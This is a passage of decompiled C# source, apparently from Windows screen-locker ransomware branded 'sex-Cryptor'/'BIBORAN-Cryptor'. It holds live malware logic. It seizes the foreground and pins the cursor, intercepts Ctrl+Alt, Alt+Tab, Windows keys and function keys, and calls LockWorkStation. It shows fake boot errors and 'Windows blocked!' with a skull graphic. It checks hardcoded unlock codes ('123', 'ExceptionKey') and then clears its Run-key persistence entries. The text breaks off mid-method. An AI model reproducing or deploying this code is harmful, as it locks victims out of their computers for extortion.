using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

[DesignerGenerated]
public class GForm2 : Form
{
	public string string_0;

	public string string_1;

	private object object_0;

	private object object_1;

	private object object_2;

	private object object_3;

	private object object_4;

	private Container container_0;

	[AccessedThroughProperty("g1")]
	[CompilerGenerated]
	private Label label_0;

	[AccessedThroughProperty("a1")]
	[CompilerGenerated]
	private Panel panel_0;

	[AccessedThroughProperty("main")]
	[CompilerGenerated]
	private Panel panel_1;

	[CompilerGenerated]
	[AccessedThroughProperty("a2")]
	private Panel panel_2;

	[AccessedThroughProperty("keytext")]
	[CompilerGenerated]
	private Label label_1;

	[CompilerGenerated]
	[AccessedThroughProperty("hdn")]
	private TextBox textBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("inputPS")]
	private Label label_2;

	[AccessedThroughProperty("srv")]
	[CompilerGenerated]
	private Timer timer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("border_6")]
	private PictureBox pictureBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("border_5")]
	private PictureBox pictureBox_1;

	[AccessedThroughProperty("border_2")]
	[CompilerGenerated]
	private PictureBox pictureBox_2;

	[AccessedThroughProperty("border_1")]
	[CompilerGenerated]
	private PictureBox pictureBox_3;

	[CompilerGenerated]
	[AccessedThroughProperty("border_8")]
	private PictureBox pictureBox_4;

	[CompilerGenerated]
	[AccessedThroughProperty("border_7")]
	private PictureBox pictureBox_5;

	[CompilerGenerated]
	[AccessedThroughProperty("border_4")]
	private PictureBox pictureBox_6;

	[CompilerGenerated]
	[AccessedThroughProperty("border_3")]
	private PictureBox pictureBox_7;

	[AccessedThroughProperty("s2")]
	[CompilerGenerated]
	private Label label_3;

	[AccessedThroughProperty("s1")]
	[CompilerGenerated]
	private Label label_4;

	[CompilerGenerated]
	[AccessedThroughProperty("cursorstylec")]
	private Timer timer_1;

	[AccessedThroughProperty("menu1")]
	[CompilerGenerated]
	private Label label_5;

	[AccessedThroughProperty("Title")]
	[CompilerGenerated]
	private Label label_6;

	[AccessedThroughProperty("art")]
	[CompilerGenerated]
	private Label label_7;

	[CompilerGenerated]
	[AccessedThroughProperty("errx")]
	private Label label_8;

	[AccessedThroughProperty("OnError")]
	[CompilerGenerated]
	private Timer timer_2;

	[AccessedThroughProperty("UserInfo")]
	[CompilerGenerated]
	private Label label_9;

	[CompilerGenerated]
	[AccessedThroughProperty("ID")]
	private Label label_10;

	[CompilerGenerated]
	[AccessedThroughProperty("clck")]
	private Timer timer_3;

	[AccessedThroughProperty("Safe1")]
	[CompilerGenerated]
	private PictureBox pictureBox_8;

	[AccessedThroughProperty("Safe2")]
	[CompilerGenerated]
	private PictureBox pictureBox_9;

	[AccessedThroughProperty("ByPassMessage")]
	[CompilerGenerated]
	private Panel panel_3;

	[AccessedThroughProperty("c3")]
	[CompilerGenerated]
	private PictureBox pictureBox_10;

	[AccessedThroughProperty("c2")]
	[CompilerGenerated]
	private PictureBox pictureBox_11;

	[AccessedThroughProperty("c4")]
	[CompilerGenerated]
	private PictureBox pictureBox_12;

	[AccessedThroughProperty("c1")]
	[CompilerGenerated]
	private PictureBox pictureBox_13;

	[AccessedThroughProperty("ByPassWarnMsg")]
	[CompilerGenerated]
	private Label label_11;

	[CompilerGenerated]
	[AccessedThroughProperty("bypasserr")]
	private Timer timer_4;

	[CompilerGenerated]
	[AccessedThroughProperty("tg")]
	private Label label_12;

	internal virtual Label g1
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_15;
			Label val = label_0;
			if (val != null)
			{
				((Control)val).Click -= eventHandler;
			}
			label_0 = value;
			val = label_0;
			if (val != null)
			{
				((Control)val).Click += eventHandler;
			}
		}
	}

	internal virtual Panel a1
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	internal virtual Panel main
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	internal virtual Panel a2
	{
		[CompilerGenerated]
		get
		{
			return panel_2;
		}
		[CompilerGenerated]
		set
		{
			panel_2 = value;
		}
	}

	internal virtual Label keytext
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual TextBox hdn
	{
		[CompilerGenerated]
		get
		{
			return textBox_0;
		}
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected O, but got Unknown
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Expected O, but got Unknown
			KeyEventHandler val = new KeyEventHandler(GForm2_KeyDown);
			KeyPressEventHandler val2 = new KeyPressEventHandler(method_3);
			KeyEventHandler val3 = new KeyEventHandler(method_7);
			TextBox val4 = textBox_0;
			if (val4 != null)
			{
				((Control)val4).KeyDown -= val;
				((Control)val4).KeyPress -= val2;
				((Control)val4).KeyUp -= val3;
			}
			textBox_0 = value;
			val4 = textBox_0;
			if (val4 != null)
			{
				((Control)val4).KeyDown += val;
				((Control)val4).KeyPress += val2;
				((Control)val4).KeyUp += val3;
			}
		}
	}

	internal virtual Label inputPS
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_2;
			Label val = label_2;
			if (val != null)
			{
				((Control)val).Click -= eventHandler;
			}
			label_2 = value;
			val = label_2;
			if (val != null)
			{
				((Control)val).Click += eventHandler;
			}
		}
	}

	internal virtual PictureBox border_6
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	internal virtual PictureBox border_5
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	internal virtual PictureBox border_2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	internal virtual PictureBox border_1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_3 = value;
		}
	}

	internal virtual PictureBox border_8
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_4;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_4 = value;
		}
	}

	internal virtual PictureBox border_7
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_5;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_5 = value;
		}
	}

	internal virtual PictureBox border_4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_6;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_6 = value;
		}
	}

	internal virtual PictureBox border_3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_7;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_7 = value;
		}
	}

	internal virtual Label s2
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	internal virtual Label s1
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	internal virtual Label menu1
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	internal virtual Label Title
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	internal virtual Label art
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	internal virtual Label errx
	{
		[CompilerGenerated]
		get
		{
			return label_8;
		}
		[CompilerGenerated]
		set
		{
			label_8 = value;
		}
	}

	internal virtual Label UserInfo
	{
		[CompilerGenerated]
		get
		{
			return label_9;
		}
		[CompilerGenerated]
		set
		{
			label_9 = value;
		}
	}

	internal virtual Label ID
	{
		[CompilerGenerated]
		get
		{
			return label_10;
		}
		[CompilerGenerated]
		set
		{
			label_10 = value;
		}
	}

	internal virtual PictureBox Safe1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_8;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_8 = value;
		}
	}

	internal virtual PictureBox Safe2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_9;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_9 = value;
		}
	}

	internal virtual Panel ByPassMessage
	{
		[CompilerGenerated]
		get
		{
			return panel_3;
		}
		[CompilerGenerated]
		set
		{
			panel_3 = value;
		}
	}

	internal virtual PictureBox c3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_10;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_10 = value;
		}
	}

	internal virtual PictureBox c2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_11;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_11 = value;
		}
	}

	internal virtual PictureBox c4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_12;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_12 = value;
		}
	}

	internal virtual PictureBox c1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_13;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_13 = value;
		}
	}

	internal virtual Label ByPassWarnMsg
	{
		[CompilerGenerated]
		get
		{
			return label_11;
		}
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_14;
			Label val = label_11;
			if (val != null)
			{
				((Control)val).Click -= eventHandler;
			}
			label_11 = value;
			val = label_11;
			if (val != null)
			{
				((Control)val).Click += eventHandler;
			}
		}
	}

	public virtual Label tg
	{
		[CompilerGenerated]
		get
		{
			return label_12;
		}
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_13;
			Label val = label_12;
			if (val != null)
			{
				((Control)val).Click -= eventHandler;
			}
			label_12 = value;
			val = label_12;
			if (val != null)
			{
				((Control)val).Click += eventHandler;
			}
		}
	}

	public GForm2()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		((Form)this).Load += GForm2_Load;
		((Control)this).KeyDown += new KeyEventHandler(GForm2_KeyDown);
		((Form)this).FormClosing += new FormClosingEventHandler(GForm2_FormClosing);
		string_0 = " ";
		string_1 = "Blue";
		object_0 = 0;
		object_1 = 0;
		object_2 = 0;
		object_3 = false;
		object_4 = 0;
		method_16();
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool mouse_event(int int_0, int int_1, int int_2, int int_3, int int_4);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int LockWorkStation();

	private void method_0(object sender, EventArgs e)
	{
		SetForegroundWindow(((Control)this).Handle.ToInt32());
		try
		{
			((Control)hdn).Focus();
			Label val = art;
			if (Operators.ConditionalCompareObjectLess(object_0, (object)200, false))
			{
				if (!Operators.ConditionalCompareObjectLess(object_0, (object)10, false))
				{
					if (!Operators.ConditionalCompareObjectLess(object_0, (object)18, false))
					{
						if (Operators.ConditionalCompareObjectEqual(object_0, (object)30, false))
						{
							((Control)val).Text = ((Control)val).Text + "\r\nMemory section at address 0x0424* is locked!";
						}
						else if (!Operators.ConditionalCompareObjectEqual(object_0, (object)35, false))
						{
							if (!Operators.ConditionalCompareObjectEqual(object_0, (object)50, false))
							{
								if (Operators.ConditionalCompareObjectEqual(object_0, (object)70, false))
								{
									val.Image = null;
									((Control)val).Text = null;
								}
								else if (Operators.ConditionalCompareObjectEqual(object_0, (object)80, false))
								{
									((Control)val).BackColor = Color.DarkRed;
									((Control)val).ForeColor = Color.White;
									((Control)val).Text = ((Control)val).Text + "\r\n               ...\r\n             ;::::;\r\n           ;::::; :;\r\n         ;:::::'   :;\r\n";
								}
								else if (Operators.ConditionalCompareObjectEqual(object_0, (object)85, false))
								{
									((Control)val).Text = ((Control)val).Text + "        ;:::::;     ;.\r\n       ,:::::'       ;           OOO\\\r\n       ::::::;       ;          OOOOO\\\r\n       ;:::::;       ;         OOOOOOOO\r\n      ,;::::::;     ;'         / OOOOOOO\r\n    ;:::::::::`. ,,,;.        /  / DOOOOOO\r\n  .';:::::::::::::::::;,     /  /     DOOOO\r\n";
								}
								else if (Operators.ConditionalCompareObjectEqual(object_0, (object)90, false))
								{
									((Control)val).Text = ((Control)val).Text + " ,::::::;::::::;;;;::::;,   /  /        DOOO\r\n;`::::::`'::::::;;;::::: ,#/  /          DOOO\r\n:`:::::::`;::::::;;::: ;::#  /            DOOO\r\n::`:::::::`;:::::::: ;::::# /              DOO\r\n`:`:::::::`;:::::: ;::::::#/               DOO\r\n :::`:::::::`;; ;:::::::::##                OO\r\n ::::`:::::::`;::::::::;:::#                OO\r\n `:::::`::::::::::::;'`:;::#                O\r\n  `:::::`::::::::;' /  / `:#\r\n   ::::::`:::::;'  /  /   `#";
									method_9();
								}
								else if (!Operators.ConditionalCompareObjectEqual(object_0, (object)140, false))
								{
									if (!Operators.ConditionalCompareObjectEqual(object_0, (object)150, false))
									{
										if (!Operators.ConditionalCompareObjectEqual(object_0, (object)160, false))
										{
											if (Operators.ConditionalCompareObjectEqual(object_0, (object)170, false))
											{
												((Control)UserInfo).Visible = true;
											}
											else if (!Operators.ConditionalCompareObjectEqual(object_0, (object)177, false))
											{
												if (Operators.ConditionalCompareObjectEqual(object_0, (object)180, false))
												{
													((Control)ID).Visible = true;
												}
											}
											else
											{
												((Control)menu1).Visible = true;
											}
										}
										else
										{
											((Control)a2).Visible = true;
										}
									}
									else
									{
										((Control)a1).Visible = true;
									}
								}
								else
								{
									string text = "Blue";
									if (Operators.CompareString(text, "WhiteBlueRed", false) != 0 && Operators.CompareString(text, "YellowBlue", false) != 0)
									{
										((Control)this).BackColor = method_17(text);
									}
									((Control)main).Visible = true;
									((Control)main).Invalidate();
								}
							}
							else
							{
								((Control)val).ForeColor = Color.Red;
								((Control)val).Text = ((Control)val).Text + "\r\n\r\n * Windows blocked!";
							}
						}
						else
						{
							((Control)val).Text = ((Control)val).Text + "\r\nService UXCryptor started.";
						}
					}
					else
					{
						Label val2;
						((Control)(val2 = val)).Text = Conversions.ToString(Operators.ConcatenateObject((object)((Control)val2).Text, Operators.ConcatenateObject((object)"\r\nBoot error: 0x0", Operators.IntDivideObject(Conversion.Int((object)Conversion.Str((object)VBMath.Rnd()).Replace(".", "").Trim()), (object)2))));
					}
				}
				else
				{
					((Control)val).Text = null;
					((Control)val).Text = "Booting Windows . . .";
				}
				object_0 = Operators.AddObject(object_0, (object)1);
			}
			((TextBoxBase)hdn).SelectionStart = Strings.Len(((Control)hdn).Text);
			((Control)inputPS).Text = Conversions.ToString(Operators.ConcatenateObject((object)((Control)hdn).Text, (object)string_0));
			Cursor.Position = new Point(5, 5);
			((Form)this).Activate();
		}
		catch (Exception)
		{
		}
	}

	private void method_1(object sender, EventArgs e)
	{
		ref object reference = ref object_1;
		reference = Operators.AddObject(reference, (object)1);
		string[] array = new string[5] { "█", "▓", "▒", "░", " " };
		object obj = object_1;
		if (!Operators.ConditionalCompareObjectEqual(obj, (object)1, false))
		{
			if (!Operators.ConditionalCompareObjectEqual(obj, (object)34, false))
			{
				if (!Operators.ConditionalCompareObjectEqual(obj, (object)37, false))
				{
					if (!Operators.ConditionalCompareObjectEqual(obj, (object)40, false))
					{
						if (!Operators.ConditionalCompareObjectEqual(obj, (object)42, false))
						{
							if (Operators.ConditionalCompareObjectEqual(obj, (object)60, false))
							{
								object_1 = 0;
							}
						}
						else
						{
							string_0 = array[4];
						}
					}
					else
					{
						string_0 = array[3];
					}
				}
				else
				{
					string_0 = array[2];
				}
			}
			else
			{
				string_0 = array[1];
			}
		}
		else
		{
			string_0 = array[0];
		}
	}

	private void method_2(object sender, EventArgs e)
	{
		((Control)inputPS).Text = ((Control)hdn).Text;
	}

	private Color method_17(string colorName)
	{
		switch (colorName)
		{
		case "WhiteBlueRed":
			return Color.FromArgb(255, 0, 0);
		case "YellowBlue":
			return Color.FromArgb(0, 87, 183);
		case "DarkRed":
			return Color.FromArgb(139, 0, 0);
		case "Green":
			return Color.Green;
		case "Orange":
			return Color.Orange;
		case "Pink":
			return Color.Pink;
		default:
			try
			{
				return Color.FromName(colorName);
			}
			catch (Exception)
			{
				return Color.Black;
			}
		}
	}

	private void method_19(object sender, PaintEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		//IL_0142: Unknown result type (might be due to invalid IL or missing references)
		//IL_0149: Expected O, but got Unknown
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		Panel val = (Panel)sender;
		string text = string_1;
		if (Operators.CompareString(text, "WhiteBlueRed", false) == 0)
		{
			int num = ((Control)val).Height / 3;
			SolidBrush val2 = new SolidBrush(Color.White);
			try
			{
				e.Graphics.FillRectangle((Brush)(object)val2, new Rectangle(0, 0, ((Control)val).Width, num));
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
			SolidBrush val3 = new SolidBrush(Color.FromArgb(0, 57, 166));
			try
			{
				e.Graphics.FillRectangle((Brush)(object)val3, new Rectangle(0, num, ((Control)val).Width, num));
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
			SolidBrush val4 = new SolidBrush(Color.FromArgb(213, 43, 30));
			try
			{
				e.Graphics.FillRectangle((Brush)(object)val4, new Rectangle(0, num * 2, ((Control)val).Width, num));
				return;
			}
			finally
			{
				((IDisposable)val4)?.Dispose();
			}
		}
		if (Operators.CompareString(text, "YellowBlue", false) == 0)
		{
			int num2 = ((Control)val).Height / 2;
			SolidBrush val5 = new SolidBrush(Color.FromArgb(255, 213, 0));
			try
			{
				e.Graphics.FillRectangle((Brush)(object)val5, new Rectangle(0, 0, ((Control)val).Width, num2));
			}
			finally
			{
				((IDisposable)val5)?.Dispose();
			}
			SolidBrush val6 = new SolidBrush(Color.FromArgb(0, 87, 183));
			try
			{
				e.Graphics.FillRectangle((Brush)(object)val6, new Rectangle(0, num2, ((Control)val).Width, num2));
			}
			finally
			{
				((IDisposable)val6)?.Dispose();
			}
		}
	}

	private void GForm2_Load(object sender, EventArgs e)
	{
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b1: Expected O, but got Unknown
		((Control)this).Text = "sex-Cryptor [GUI] {@sex}";
		((Control)Class1.MyForms_0.loader).Text = "BIBORAN-Cryptor [Runtime] {@sex}";
		try
		{
			((Control)ID).Text = Conversions.ToString(Operators.ConcatenateObject((object)("ID: 10-A" + File.ReadAllText(Class1.MyForms_0.loader.string_4) + "0E"), Operators.IntDivideObject(Conversion.Int((object)File.ReadAllText(Class1.MyForms_0.loader.string_4)), (object)15)));
		}
		catch (Exception)
		{
			Class1.MyForms_0.loader.object_0 = true;
		}
		((Control)this).Cursor.Dispose();
		((Control)hdn).ContextMenu = new ContextMenu();
		((Control)this).BackColor = Color.Black;
		((Control)UserInfo).Text = "Current PC: " + ((ServerComputer)Class1.Class0_0).Name;
	}

	private void GForm2_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Invalid comparison between Unknown and I4
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Invalid comparison between Unknown and I4
		//IL_0060: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Invalid comparison between Unknown and I4
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Invalid comparison between Unknown and I4
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Invalid comparison between Unknown and I4
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Invalid comparison between Unknown and I4
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Invalid comparison between Unknown and I4
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Invalid comparison between Unknown and I4
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Invalid comparison between Unknown and I4
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Invalid comparison between Unknown and I4
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Invalid comparison between Unknown and I4
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f6: Invalid comparison between Unknown and I4
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Invalid comparison between Unknown and I4
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Invalid comparison between Unknown and I4
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Invalid comparison between Unknown and I4
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Invalid comparison between Unknown and I4
		//IL_017c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0183: Invalid comparison between Unknown and I4
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_0179: Invalid comparison between Unknown and I4
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Invalid comparison between Unknown and I4
		//IL_019b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Invalid comparison between Unknown and I4
		//IL_0186: Unknown result type (might be due to invalid IL or missing references)
		//IL_018d: Invalid comparison between Unknown and I4
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Invalid comparison between Unknown and I4
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b6: Invalid comparison between Unknown and I4
		//IL_01a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ac: Invalid comparison between Unknown and I4
		//IL_0153: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Invalid comparison between Unknown and I4
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Invalid comparison between Unknown and I4
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c0: Invalid comparison between Unknown and I4
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Invalid comparison between Unknown and I4
		//IL_01d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01df: Invalid comparison between Unknown and I4
		//IL_0201: Unknown result type (might be due to invalid IL or missing references)
		//IL_0208: Invalid comparison between Unknown and I4
		//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f3: Invalid comparison between Unknown and I4
		//IL_0215: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Invalid comparison between Unknown and I4
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0212: Invalid comparison between Unknown and I4
		//IL_0234: Unknown result type (might be due to invalid IL or missing references)
		//IL_023b: Invalid comparison between Unknown and I4
		//IL_021f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0226: Invalid comparison between Unknown and I4
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Invalid comparison between Unknown and I4
		//IL_023e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0245: Invalid comparison between Unknown and I4
		//IL_0267: Unknown result type (might be due to invalid IL or missing references)
		//IL_026e: Invalid comparison between Unknown and I4
		//IL_0252: Unknown result type (might be due to invalid IL or missing references)
		//IL_0259: Invalid comparison between Unknown and I4
		//IL_027b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0282: Invalid comparison between Unknown and I4
		//IL_0271: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Invalid comparison between Unknown and I4
		//IL_0285: Unknown result type (might be due to invalid IL or missing references)
		//IL_028c: Invalid comparison between Unknown and I4
		//IL_02a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a9: Invalid comparison between Unknown and I4
		//IL_02bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c6: Invalid comparison between Unknown and I4
		//IL_02dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e3: Invalid comparison between Unknown and I4
		//IL_0316: Unknown result type (might be due to invalid IL or missing references)
		//IL_031d: Invalid comparison between Unknown and I4
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_0308: Invalid comparison between Unknown and I4
		try
		{
			if (Operators.CompareString(((Control)hdn).Text, "CtrlAltAllowed", false) != 0 && (e.Control & e.Alt))
			{
				vmethod_8().Start();
				LockWorkStation();
			}
			if (e.Alt && (int)e.KeyCode == 9)
			{
				vmethod_8().Start();
			}
			if ((int)e.KeyCode == 91 || (int)e.KeyCode == 92)
			{
				vmethod_8().Start();
			}
			if (((int)e.KeyCode == 76 && (int)e.Modifiers == 91) || ((int)e.KeyCode == 76 && (int)e.Modifiers == 92))
			{
				vmethod_8().Start();
				LockWorkStation();
			}
			if (e.Control && ((int)e.KeyCode == 27 || (int)e.KeyCode == 16 || (int)e.KeyCode == 46))
			{
				vmethod_8().Start();
			}
			if (e.Control && e.Shift && (int)e.KeyCode == 27)
			{
				vmethod_8().Start();
			}
			if (e.Alt && (int)e.KeyCode == 115)
			{
				vmethod_8().Start();
			}
			if ((int)e.KeyCode == 27 || (int)e.KeyCode == 115 || (int)e.KeyCode == 116 || (int)e.KeyCode == 119 || (int)e.KeyCode == 122 || (int)e.KeyCode == 123)
			{
				vmethod_8().Start();
			}
			if (((int)e.KeyCode == 68 && (int)e.Modifiers == 91) || ((int)e.KeyCode == 68 && (int)e.Modifiers == 92))
			{
				vmethod_8().Start();
			}
			if (((int)e.KeyCode == 69 && (int)e.Modifiers == 91) || ((int)e.KeyCode == 69 && (int)e.Modifiers == 92))
			{
				vmethod_8().Start();
			}
			if (((int)e.KeyCode == 82 && (int)e.Modifiers == 91) || ((int)e.KeyCode == 82 && (int)e.Modifiers == 92))
			{
				vmethod_8().Start();
			}
			if (((int)e.KeyCode == 88 && (int)e.Modifiers == 91) || ((int)e.KeyCode == 88 && (int)e.Modifiers == 92))
			{
				vmethod_8().Start();
			}
			if (((int)e.KeyCode == 73 && (int)e.Modifiers == 91) || ((int)e.KeyCode == 73 && (int)e.Modifiers == 92))
			{
				vmethod_8().Start();
			}
			if (((int)e.KeyCode == 9 && (int)e.Modifiers == 91) || ((int)e.KeyCode == 9 && (int)e.Modifiers == 92))
			{
				vmethod_8().Start();
			}
			if (e.Control && (int)e.KeyCode == 87)
			{
				vmethod_8().Start();
			}
			if (e.Control && (int)e.KeyCode == 81)
			{
				vmethod_8().Start();
			}
			if (e.Alt && (int)e.KeyCode == 13)
			{
				vmethod_8().Start();
			}
			if (e.Control && e.Alt && (int)e.KeyCode == 46)
			{
				vmethod_8().Start();
			}
			if ((int)e.KeyCode == 13)
			{
				Label obj = menu1;
				((Control)obj).BackColor = Color.White;
				((Control)obj).ForeColor = Color.Black;
				if (Interaction.Command().Contains("debug") && Operators.CompareString(((Control)hdn).Text, "123", false) == 0)
				{
					ProjectData.EndApp();
				}
				if (Operators.CompareString(((Control)hdn).Text, "123", false) == 0)
				{
					method_5();
				}
				else
				{
					vmethod_4().Start();
				}
			}
		}
		catch (Exception)
		{
			Class1.MyForms_0.loader.object_0 = true;
		}
		if (Conversions.ToBoolean(Class1.MyForms_0.loader.object_0))
		{
			vmethod_4().Start();
			((Control)errx).Text = "Произошёл сбой! Обратитесь за аварийным ключом.";
			if (Operators.CompareString(((Control)hdn).Text, "ExceptionKey", false) == 0)
			{
				method_5();
				ProjectData.EndApp();
			}
		}
	}

	private void method_3(object sender, KeyPressEventArgs e)
	{
		object_1 = 0;
		e.Handled = !LikeOperator.LikeString(Conversions.ToString(e.KeyChar), "[a-z,A-Z\b,0-9]", (CompareMethod)0);
	}

	private void method_4(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(object_3, (object)false, false))
		{
			method_8();
			object_3 = true;
		}
		((Control)errx).Visible = true;
		ref object reference = ref object_2;
		reference = Operators.AddObject(reference, (object)1);
		if (Operators.ConditionalCompareObjectEqual(object_2, (object)20, false))
		{
			object_3 = false;
			((Control)errx).Visible = false;
			vmethod_4().Stop();
			object_2 = 0;
		}
	}

	public void method_5()
	{
		try
		{
			int num = 1;
			do
			{
				RegistryKey registryKey = ((ServerComputer)Class1.Class0_0).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				try
				{
					registryKey.DeleteValue("WIN32_" + Conversions.ToString(num));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				num = checked(num + 1);
			}
			while (num <= 8);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		method_6();
		try
		{
			File.Delete(Class1.MyForms_0.loader.string_4);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
